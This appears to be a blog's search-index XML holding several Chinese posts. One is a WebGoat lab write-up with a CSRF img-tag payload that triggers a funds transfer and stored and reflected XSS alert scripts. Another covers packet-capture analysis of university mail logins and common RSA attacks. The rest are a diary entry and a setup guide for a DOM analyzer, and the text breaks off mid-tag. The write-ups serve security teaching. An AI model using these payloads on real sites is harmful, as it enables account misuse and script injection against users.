<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Web练习——Web应用程序攻击</title>
    <link href="/2023/03/15/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/"/>
    <url>/2023/03/15/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="Web练习——Web应用程序攻击"><a href="#Web练习——Web应用程序攻击" class="headerlink" title="Web练习——Web应用程序攻击"></a>Web练习——Web应用程序攻击</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;实验环境说明：实验均在 Webgoat 下进行，需要抓包工具支持。Webgoat、抓包 工 具 Burpsuite 社 区 版 (Windows) 以 及 Webscarab 均可在<a href="https://mclass.cn3.quickconnect.cn/notes/Web">https://mclass.cn3.quickconnect.cn/notes/Web</a> 安全 目录中下载，你也可以使用其他的能够截获 HTTP 的工具进行实验</p><p>&emsp;&emsp;Webgoat 为 Web 安全实验平台，可以在本地安装，使用虚拟机构造服务器192.168.188.128</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/1.png" style="zoom:80%;" /></center><p>&emsp;&emsp;抓包工具，可以使用 Burpsuite 和 Webscarab</p><p>&emsp;&emsp;（这是之前的作业题目，也是回顾一下相关的攻击，包括webgoat好久没用了）</p><p>&emsp;</p><h4 id="1-跨站请求伪造攻击"><a href="#1-跨站请求伪造攻击" class="headerlink" title="1.跨站请求伪造攻击"></a>1.跨站请求伪造攻击</h4><p>&emsp;&emsp;使用两个不同的浏览器 ： 浏 览 器 A 和 浏 览 器 B ， 同时登录webgoat ：<a href="http://192.168.188.128/webgoat/attack">http://192.168.188.128/webgoat/attack</a> (依据你的服务器地址和端口可能)。记下各自的cookie 值</p><ul><li><p>谷歌登录：</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/2.png" style="zoom:80%;" /></center></li><li><p>火狐登录：</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/3.png" style="zoom:80%;" /></center></li></ul><p>&emsp;&emsp;然后查看两个浏览器的相关cookie内容：</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/4.png" style="zoom:80%;" /></center><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/5.png" style="zoom:80%;" /></center><p>&emsp;&emsp;选择 webgoat 中的Cross-site Scripting (XSS) - Cross Site Request Forgery(CSRF)</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/6.png" style="zoom:80%;" /></center><p>&emsp;&emsp;浏览器 A (CSRF 攻击者) 填写 bbs 信息并提交,其中消息包括</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;img src<span class="hljs-operator">=</span><span class="hljs-string">&quot;http://localhost:8888/webgoat/attack?Screen=81&amp;menu=210&amp;transferFunds=88888&quot;</span> width<span class="hljs-operator">=</span><span class="hljs-string">&quot;1&quot;</span> height<span class="hljs-operator">=</span><span class="hljs-string">&quot;1&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;注：数值 88888 可以修改成自己设置的数值</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/7.png" style="zoom:80%;" /></center><p>&emsp;&emsp;点击 Submit 后</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/8.png" style="zoom:80%;" /></center><p>&emsp;&emsp;通过浏览器 B(受害者)，点击 Message List 中的链接</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/9.png" style="zoom:80%;" /></center><p>&emsp;&emsp;查看抓包记录（下图为 Webscarab 记录）</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/10.png" style="zoom:80%;" /></center><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/11.png" style="zoom:80%;" /></center><p>&emsp;&emsp;火狐相关抓包</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/12.png" style="zoom:80%;" /></center><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/13.png" style="zoom:80%;" /></center><p>&emsp;&emsp;解释所观察到的现象为什么是一个典型的CSRF 攻击</p><ol><li>用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；</li><li>在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；</li><li>用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；</li><li>网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；</li><li>浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。</li></ol><p>&emsp;&emsp;在所抓包的数据中我们可以看到，在火狐点击相关的网址界面后，，所使用的cookie值最后反馈在数据包中，这样子就能被谷歌的攻击者所利用，并以火狐受害者的身份以及权限进行相关操作，因此这是一个典型的CSRF攻击</p><p>&emsp;</p><h4 id="2-跨站脚本攻击"><a href="#2-跨站脚本攻击" class="headerlink" title="2.跨站脚本攻击"></a>2.跨站脚本攻击</h4><p>&emsp;&emsp;访问 <a href="http://192.168.188.128/webgoat/attack">http://192.168.188.128/webgoat/attack</a> （地址/端口依据实际来定义）选择 Cross-Site Scripting (XSS)</p><p>&emsp;&emsp;LAB: Cross Site Scripting</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/14.png" style="zoom:80%;" /></center><p>&emsp;&emsp;(1) 选择 Stage 1,进行存储型 XSS 攻击</p><p>&emsp;&emsp;以 Tom 的身份, 在编辑个人信息页面上的 Street 字段写入脚本,</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">script</span>&gt;alert(“SXSS Hacked <span class="hljs-keyword">by</span> 你的名字”);&lt;/<span class="hljs-keyword">script</span>&gt;<br></code></pre></td></tr></table></figure><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/15.png" style="zoom:80%;" /></center><p>&emsp;&emsp;并以其他用户的身份(如 Jerry) 登录, 验证该用户受到这个攻击。</p><p>&emsp;&emsp;注: 口令字为用户名的小写形式, 如 Tom 的口令字为 tom</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/16.png" style="zoom:80%;" /></center><p>&emsp;&emsp;这里由于不能识别中文，所以将姓名改为名字缩写，然后攻击成功了，选择 stage 5，反射型 XSS 攻击. 以任一用户登录，点击 Search Staff，输入</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&lt;<span class="hljs-keyword">script</span>&gt;alert(“RXSS Hacked <span class="hljs-keyword">by</span> 你的名字”);&lt;/<span class="hljs-keyword">script</span>&gt;<br></code></pre></td></tr></table></figure><p>&emsp;&emsp;点击确定，验证该用户受到这个攻击</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/17.png" style="zoom:80%;" /></center><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/18.png" style="zoom:80%;" /></center><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%94%BB%E5%87%BB/19.png" style="zoom:80%;" /></center><p>&emsp;&emsp;存储型XSS：存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie</p><p>&emsp;&emsp;反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。</p><p>&emsp;&emsp;通过两种跨站脚本攻击，我们都是利用了html的相关脚本漏洞通过alert达到我们想要的内容警报效果，这都是输入的漏洞问题</p><p>&emsp;</p><h4 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h4><p>——跨站点请求伪造</p><p>&emsp;&emsp;&emsp;&emsp;CSRF尽管听起来很像XSS跨站脚本攻击，但是它于XSS完全不同。XSS是利用站点内的信任用户，而CSRF则是通过伪装来自受信任用户的请求来利用受信任的站点，从而在并未授权的情况下执行在权限保护之下的操作。与XSS相比，CSRF攻击不大流行和难以防范，所以比XSS更具危险性。</p><p>&emsp;&emsp;&emsp;&emsp;服务端的预防CSRF攻击的方式方法有多种，但思想上都是差不多的，主要从以下2个方面入手：</p><p>&emsp;&emsp;&emsp;&emsp;1、正确使用GET,POST和Cookie</p><p>&emsp;&emsp;&emsp;&emsp;2、在非GET请求中增加伪随机数</p><p>——跨站脚本攻击</p><p>&emsp;&emsp;&emsp;&emsp;XSS跨站脚本攻击指攻击者在网页中嵌入客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的，比如获取用户的Cookie，导航到恶意网站，携带木马等。</p><p>&emsp;&emsp;&emsp;&emsp;针对XSS跨站脚本攻击，我们的防御原则是不相信用户输入的数据，对应的防御措施如下：</p><p>&emsp;&emsp;&emsp;&emsp;1、在cookie中不要存放一些敏感信息</p><p>&emsp;&emsp;&emsp;&emsp;2、输入过滤校验，对用户提交的数据进行有效性验证</p>]]></content>
    
    
    <categories>
      
      <category>web练习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Web练习——数据包分析</title>
    <link href="/2023/03/11/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/"/>
    <url>/2023/03/11/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Web练习——数据包分析"><a href="#Web练习——数据包分析" class="headerlink" title="Web练习——数据包分析"></a>Web练习——数据包分析</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;主要做一下抓包工具分析Web应用传输的数据的复现（之前大三web课程的作业整理了一下）</p><p>&emsp;</p><h4 id="1-配置抓包工具Burpsuite-Wireshark"><a href="#1-配置抓包工具Burpsuite-Wireshark" class="headerlink" title="1.配置抓包工具Burpsuite/Wireshark"></a>1.配置抓包工具Burpsuite/Wireshark</h4><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/1.png" style="zoom:80%;" /></center><p>&emsp;&emsp;Burp Suite 是一款集成化的渗透测试工具，包含了很多功能，可以帮助我们高效地 完成对 Web 应用程序的渗透测试和攻击。</p><p>&emsp;&emsp; Burp Proxy 的拦截功能主要由 intercept（intercept 拦截/截夺）选项卡中的 Forward、Drop、Interception is on/off 和 Action 构成，他们的功能如下所示。 </p><p>&emsp;Forward（放包）：表示将拦截的数据表或修改后的数据包发送至服务器端。</p><p>&emsp;&emsp; Drop（废包）：表示丢弃当前拦截的数据包 </p><p>&emsp;&emsp;Interception is on（拦截请求）：表示开启拦截功能，单击后变为 interception is off（拦截禁用），表示关闭拦截功能</p><p>&emsp;&emsp;单击 Action（行动）按钮：可以将数据包进一步发送到 Spider、scanner、Repeater、 Intruder 等功能组件做进一步测试，同时也包含改变数据包请求方式及其 body 的编码 功能。（发送到其他功能组件）</p><p>&emsp;</p><h4 id="2-访问过程"><a href="#2-访问过程" class="headerlink" title="2.访问过程"></a>2.访问过程</h4><p>&emsp;&emsp;访问某些国内大学的主页，选择使用 http 访问的邮件服务器，以德州学院的邮箱服务为例</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/2.png" style="zoom:80%;" /></center><p>&emsp;&emsp;HOST：主机或域名地址。 </p><p>&emsp;&emsp;Accept：指浏览器或其他客户可以接受的 MIME 格式。Servlet 可以根据它判断并返 回适当的文件格式。 </p><p>&emsp;&emsp;User-Agent：是客户端浏览器名称。 </p><p>&emsp;&emsp;Host：对应网址 URL 中的 Web 名称和端口号。</p><p>&emsp;&emsp;Accept-Langeuage：指出浏览器可以接受的语言种类。</p><p>&emsp;&emsp;connection：用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的， HTTP/1.1 使用 Keep-Alive 为默认值。 </p><p>&emsp;&emsp;Cookie：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型 数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。 </p><p>&emsp;&emsp;Referer：表示产生的网页 URL。如此从网页/icconcept/index.jsp 中点击一个链接 到网页/icwork/search，在服务器发送的 GET/icwoek/search 中的请求中，Referer 是 <a href="http://hostname:8080/icconcept/index.jsp%E3%80%82%E8%BF%99%E4%B8%AA%E5%B1%9E%E6%80%A7%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E8%BF%BD%E8%B8%AA">http://hostname:8080/icconcept/index.jsp。这个属性可以用来追踪</a> web 请求是从什 么网站来的。</p><p>&emsp;</p><h4 id="3-尝试输入虚构的帐号口令字进行登录"><a href="#3-尝试输入虚构的帐号口令字进行登录" class="headerlink" title="3.尝试输入虚构的帐号口令字进行登录"></a>3.尝试输入虚构的帐号口令字进行登录</h4><p>&emsp;&emsp;在上面抓取到的数据包中可以看见，访问的协议是 HTTP/1.1 版本，使用 GET 进行传输等 信息，通过数据包的内容，我们可以查询到相关版本从而进行对应的漏洞查找</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/3.png" style="zoom:80%;" /></center><p>&emsp;&emsp;如图所示，我们选择使用账号与密码同为 123456 作为输入内容进行数据包的抓取</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/4.png" style="zoom:80%;" /></center><p>&emsp;&emsp;在所显示的的数据包中我们可以看到，所谓的用户名与密码在 http 的传输中是明文 加密的，可以轻易的就抓到传输的数据，显然是十分不安全的，随后我们捕获网络踪迹并保存</p><p>&emsp;</p><h4 id="4-访问广大-广工或者其他使用腾讯邮件服务的邮件服务器"><a href="#4-访问广大-广工或者其他使用腾讯邮件服务的邮件服务器" class="headerlink" title="4.访问广大/广工或者其他使用腾讯邮件服务的邮件服务器"></a>4.访问广大/广工或者其他使用腾讯邮件服务的邮件服务器</h4><p>&emsp;&emsp;尝试帐号登录</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/5.png" style="zoom:80%;" /></center><p>&emsp;&emsp;如图所示，我们依旧选择使用账号与密码同为 123456 作为输入内容进行数据包的抓取</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/7.png" style="zoom:80%;" /></center><p>&emsp;&emsp;在所显示的的数据包中我们可以看到，用户名在传输的过程中使用的是明文传输， 但是对于密码的传输是采用了密文加密的效果，通过网站的源码也能看出是 RSA 的加密方式</p><p>&emsp;</p><h4 id="5-实验分析"><a href="#5-实验分析" class="headerlink" title="5.实验分析"></a>5.实验分析</h4><p>&emsp;&emsp;对实验过程截屏，通过适当踪迹数据和 HTML 文本，</p><ul><li><p>问题1 ：在 HTTP 访问教育网中的邮件服务器的踪迹中是否发现帐号口令字？为什么？ </p><p>&emsp;&emsp;首先是在 HTTP 访问邮件服务器的踪迹中确实能够发现账号口令字，这是因为 HTTP 作为超文本传输协议，与 HTTPS 最大的区别就在于 HTT 采取不加密的传输，所以在传输 的过程中是以明文的方式进行交互，这也就导致了我们在抓包的过程中，能够准确的查 看到相关重要信息</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/8.png" style="zoom:80%;" /></center><p>&emsp;&emsp;在德州学院学生邮箱的网址界面源码中，对于密码的传输基本那只涉及到一些是否 为空的基本条件判断，对于传输的过程并没有进一步的加密措施</p></li><li><p>问题2：能否从登录使用腾讯邮件服务的邮箱踪迹中发现帐号口令字等相关信息？为什 么</p><p>&emsp;&emsp;在步骤三实验的数据包中，我们依旧可以查找到账号以及口令的相关内容和信息， 但是不同的是，腾讯邮件服务在对数据进行传输中，进行了选择性的加密方法。账号是 以明文的形式呈现在数据包中，而口令是明显进行处理并加密的</p></li><li><p>问题3：依据所保存的 HTML 文档，解释使用腾讯邮件服务的邮箱帐号登录是如何保护你 的输入凭证的？有什么样的攻击方法可以攻击这样的登录过程？</p><center><img src="/img/Web%E7%BB%83%E4%B9%A0%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/9.png" style="zoom:80%;" /></center><p>通过查看 HTML 文本，我们可以发现，在对口令的处理方式是进行 RSA 加密，所以在 抓取数据包的界面中，所看见的口令是密文效果。 RSA 算法的安全性依赖于大整数分解的困难性。 最直接的攻击方法是分解 n 得到 p,q，进而基于 e 计算 d，随着计算机运算能力的不断提高，通过二次筛法已能分解 180 多位的十进制素数，增加 p,q 的长度已成为许多安全应用系统的加密要求。 另一方面， 利用系统设计和实现的缺陷， 人们也提出了一些基于非因子分解方式破解 RSA 算法的 方案。 目前，对 RSA 算法的攻击主要有以下几种： </p><p>&emsp;&emsp;1）模数 n 的因子分解 分解模数 n 是最直接的攻击方法，也是最困难的方法。 攻击者可以获得公钥 e 和 模数 n；如果 n=p*q 被成功分解，则攻击者可以计算出φ(n)=(p-1)(q-1)，进而从 ed ≡1 mod φ(n)解得私钥 d </p><p>&emsp;&emsp;2）公共模数攻击 若一个多用户系统中只采用一个模数 n，不同的用户拥有不同的 e 和 d，系统将是 危险的。 在此系统中，若有同一消息用不同的公钥加密，这些公钥共模且互质，那该信 息无需私钥就可解密。 举例来说，设 P 为信息明文，两个加密公钥为 e1 和 e2，公共 模数是 n，有：C1=Pe1 mod n 和 C2=Pe2 mod n。如果攻击者获得 n、e1、e2、C1 和 C2， 就能得到 P。 </p><p>&emsp;&emsp;3）小指数攻击 如果 RSA 系统的公钥 e 选取较小的值， 可以使加密和验证签名的速度有所提高。 但如果 e 取得太小，就容易受到小指数攻击。 例如，有同一系统的三个用户，分别使 用不同的模数 n1，n2，n3，但都选取 e=3；另有一用户欲将同一明文消息 P 发送给以 上三人，使用各人的公钥加密得：C1=P3 (mod n1)，C2=P3 (mod n2)和 C3=P3 (mod n3) 一般地，n1，n2，n3 互素（否则，会比较容易求出公因子，降低安全性），根据中国剩 余定理，可由 C1，C2，C3 计算：C=P3 (mod n1<em>n2</em>n3) </p><p>&emsp;&emsp;4）选择密文攻击 选择密文攻击指的是攻击者能选择不同的密文，并拥有对应的明文，由此推出想要 的信息。一般攻击者会伪装若干信息，让拥有私钥的用户签名，由此获得有用的明文密文对，然后推算想要的信息。</p><p>&emsp;&emsp; 该方法最为复杂，从算法上无法解决这一问题，主要对应策略有两条：1）私钥持有 者不对不信任的信息签名；2）签名信息时，先使用 Hash 函数生成的摘要，再对摘要签 名，避免直接对信息的签名。</p></li></ul><p>&emsp;</p><h4 id="6-实验总结"><a href="#6-实验总结" class="headerlink" title="6.实验总结"></a>6.实验总结</h4><p>&emsp;&emsp;本次实验利用抓包工具分析 Web 应用传输的数据，通过该实验很好的了解了 http 和 https 的数据情况，首先是对数据包的结构进行了回顾，其次是是熟练了 burpsuit 的抓包使用。 </p><p>&emsp;&emsp;在 http 和 https 的数据包中，明显的差异便是前者没有重要信息加密，后者是进行 了主要信息加密的，值得一提的是，部分大学邮箱的网址访问是 http 协议，但是在抓取包的时候发现口令是进行了加密的，譬如一开始尝试登录的是深圳技术大学的学生邮箱， 他们使用的就是 http 协议结构，但无法直接获取到相关的口令传输。</p><p>&emsp;&emsp; 通过查找资料，明白了有些学校采用的是前端加密的 http 协议结构方法，这样子也 在一定程度上保护了信息的安全性和保密性，但是前端加密和 https 的区别还未掌握， 他们的体系的不同也就导致了漏洞重点的不同，这一点还有待我去挖掘。</p>]]></content>
    
    
    <categories>
      
      <category>web练习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>日记——关于所谓的喜欢</title>
    <link href="/2023/03/10/%E5%85%B3%E4%BA%8E%E6%89%80%E8%B0%93%E7%9A%84%E5%96%9C%E6%AC%A2/"/>
    <url>/2023/03/10/%E5%85%B3%E4%BA%8E%E6%89%80%E8%B0%93%E7%9A%84%E5%96%9C%E6%AC%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="日记——关于所谓的喜欢"><a href="#日记——关于所谓的喜欢" class="headerlink" title="日记——关于所谓的喜欢"></a>日记——关于所谓的喜欢</h1><p>&emsp;&emsp;这是博客的第一百篇文章了，我想学的东西很多，但是时间好像一直在赶着我走，渗透的体系我还是觉得自己并不完善，这也是接下来的首要目标，尽快的完善它吧。吉他和摄影的学习也需要提上日程咯，不过这些都不是我想说的重点。还是有写日记的习惯，只是一般不怎么喜欢放到博客中，但总归是有值得纪念的东西，决定每一百篇，那就写一篇感悟的日记以此缅怀这该死的生活吧，这一篇我想说的大抵的一些生活的想法和感悟，可能断断续续，也可能说的乱七八糟，无所谓了，就这样吧。</p><p>&emsp;&emsp;又出去玩了，永庆坊看来也不过如此吧，合看着过去的老建筑和老物件突然感慨着时间过得很快啊，一下子大学就已经大四下学期了，我们好像感受了什么，有好像没感受到多少，当初疫情解封的通知出来时，内心大抵存在一种不平等吧，或许后面这破疫情都不会影响我们生活了，但从大一下学期家里蹲开始到封控学校的三年时光，我们这一届的大学生活好像失去了很多本可以触及的乐趣，太多的东西都如同泡影般，听着师兄师姐讲述那时候的过去，脑海构造着不属于现实的幻想场景，也不过仅此而已，其实我们也依旧得到的不少了。但总觉得如同海伦凯勒所讲述的“人类的悲哀便在于此，拥有的东西不去珍惜，对于得不到的却永远渴望”，所谓的幻想也不过是内心的不甘心在作怪而已</p><center><img src="/img/%E5%85%B3%E4%BA%8E%E6%89%80%E8%B0%93%E7%9A%84%E5%96%9C%E6%AC%A2/1.jpg" style="zoom:40%;" /></center><center><img src="/img/%E5%85%B3%E4%BA%8E%E6%89%80%E8%B0%93%E7%9A%84%E5%96%9C%E6%AC%A2/2.jpg" style="zoom:30%;" /></center><p>&emsp;&emsp;到了吃晚饭的时候，突然被问起喜欢什么样的女生，什么样的女孩子呢，其实我很难去描述。我能清楚的明白心里喜欢的是什么，但这是无法通过言语就能够表达与描述的， 似乎更像是一种感觉，并不是以衡量标准去定义，也不是有参数去表达，只是说如果有那么个人站在我的面前，我能清楚的知道这是一种喜欢；或是所谓的惊鸿一瞥，亦或是生活相处陪伴的点点滴滴，如果说偏向，我大抵是偏向于后者。这种大致所谓的感觉也就出现过三次，大抵可惜也止步于个人的自卑，故事总是有这样的，没有所谓的开篇也没有所谓的结尾，它仅仅以预告作为全部，但这之中预告却无疑最吸引人。</p><center><img src="/img/%E5%85%B3%E4%BA%8E%E6%89%80%E8%B0%93%E7%9A%84%E5%96%9C%E6%AC%A2/4.png" style="zoom:40%;" /></center><center><img src="/img/%E5%85%B3%E4%BA%8E%E6%89%80%E8%B0%93%E7%9A%84%E5%96%9C%E6%AC%A2/5.png" style="zoom:60%;" /></center><p>&emsp;&emsp;少年与爱永不老去，即便披荆斩棘，丢失怒马鲜衣——莫峻</p><p>&emsp;&emsp;或许我所理解的与作者并不同，我会对世间的事物保持美好的期待，这一切的遇见，或许糟糕，或许欣喜，不过是为了丰富我的阅历与知识，也让我成长与提高。我们或许会物质上的老去，但少年与爱的精神大抵是不会变更的（不咋爱看青春文学。只是这句话感觉有点意思，相比这种，我更爱看明朝那些事，更爱张居正，但更爱王阳明……）</p><center><img src="/img/%E5%85%B3%E4%BA%8E%E6%89%80%E8%B0%93%E7%9A%84%E5%96%9C%E6%AC%A2/3.jpg" style="zoom:40%;" /></center>]]></content>
    
    
    <categories>
      
      <category>日记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>环境准备——DOM分析器</title>
    <link href="/2023/03/10/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/"/>
    <url>/2023/03/10/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="环境准备——DOM分析器"><a href="#环境准备——DOM分析器" class="headerlink" title="环境准备——DOM分析器"></a>环境准备——DOM分析器</h1><h4 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h4><p>&emsp;&emsp;这是记录自己搭建和配置大佬造出来的轮子的记录，希望能少走一些弯路吧</p><p>&emsp;</p><h4 id="1-安装kali2022"><a href="#1-安装kali2022" class="headerlink" title="1.安装kali2022"></a>1.安装kali2022</h4><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/1.png" style="zoom:100%;" /></center><p>&emsp;</p><h4 id="2-安装DOM破坏分析器"><a href="#2-安装DOM破坏分析器" class="headerlink" title="2.安装DOM破坏分析器"></a>2.安装DOM破坏分析器</h4><p>&emsp;&emsp;直接git clone就好了，作者给的命令thething中后缀最好加上.git。这是需要注意的，中途可能会遇到像下面的情况，就一直git clone就完事了，总能连通的，github老问题了。TheThing 的源代码已与<a href="https://soheilkhodayari.github.io/JAW/">JAW</a>合并，生成<a href="https://github.com/SoheilKhodayari/JAW/releases/tag/v2.0.1">JAW-v2</a>。这个存储库使用<a href="https://github.com/SoheilKhodayari/JAW/releases/tag/v2.0.1">JAW-v2</a>作为<a href="https://git-scm.com/book/en/v2/Git-Tools-Submodules">git submodule</a>。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SoheilKhodayari/</span>TheThing<br>cd TheThing<br>git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SoheilKhodayari/</span>JAW --branch v2.<span class="hljs-number">0.1</span> <br></code></pre></td></tr></table></figure><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/2.png" style="zoom:100%;" /></center><center><img src="/img/DOM%E6%94%BB%E5%87%BB%E8%AF%BE%E9%A2%98%E5%9B%9B/3.png" style="zoom:100%;" /></center><p>&emsp;&emsp;然后，将 JAW 的内容复制到根目录中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp -rf .<span class="hljs-regexp">/JAW/</span>* ./<br></code></pre></td></tr></table></figure><center><img 